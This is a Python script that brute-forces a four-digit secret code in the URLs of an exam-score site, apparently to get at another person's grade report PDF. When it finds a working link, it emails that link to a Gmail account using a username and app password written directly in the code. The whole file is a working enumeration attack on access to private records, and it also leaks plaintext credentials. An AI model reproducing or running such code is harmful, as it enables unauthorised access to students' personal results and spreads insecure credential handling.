import os
import smtplib


import requests


my_code ='60afe172b525831a6220e008'
def find_grades():
    limit = 10000
    number1 = 0000
    est = "ESTI"
    Exam_Date = '202303'
    idd = my_code
    date = '232'
    # gpass = input("input gmail password if u want email send if not leave empty ")

    response = requests.get(
        "https://scores.egypt.estests.com/202211/ESTI/612e54a35bed532694c54fef-xxxx223.pdf")
    if response.status_code != 404:
        print("lol")

    elif response.status_code == 404:
        os.system('cls')

        print("I am Searching can take up to 1 hour based on the person secret code")


        for i in range(limit):
            number1 += 1
            number2 = str(number1)
            number3 = number2.zfill(4)
            msg = "https://scores.egypt.estests.com/" + Exam_Date + "/" + est + "/" + idd + "-" + number3 + date + \
                  ".pdf"
            lol = requests.get(msg)
            print(msg)
            if lol.status_code != 404:
                os.system('cls')

                print("Exam Secret code is : " + str(number3))
                gmail_user = 'ziyadfathi5@gmail.com'
                gmail_password = 'zivavsquabvsgjiw'

                sent_from = gmail_user
                to = ['ziyadfathi5@gmail.com']
                subject = 'Link from Adham app'
                body = "The link has been found successful here it is : \n" + msg

                email_text = """\
                From: %s
                To: %s
                Subject: %s

                %s
                """ % (sent_from, ", ".join(to), subject, body)

                try:
                    smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                    smtp_server.ehlo()
                    smtp_server.login(gmail_user, gmail_password)
                    smtp_server.sendmail(sent_from, to, email_text)
                    smtp_server.close()

                    print("Email sent successfully!")


                except Exception as ex:

                    print("Something went wrong….", ex)


                break


find_grades()

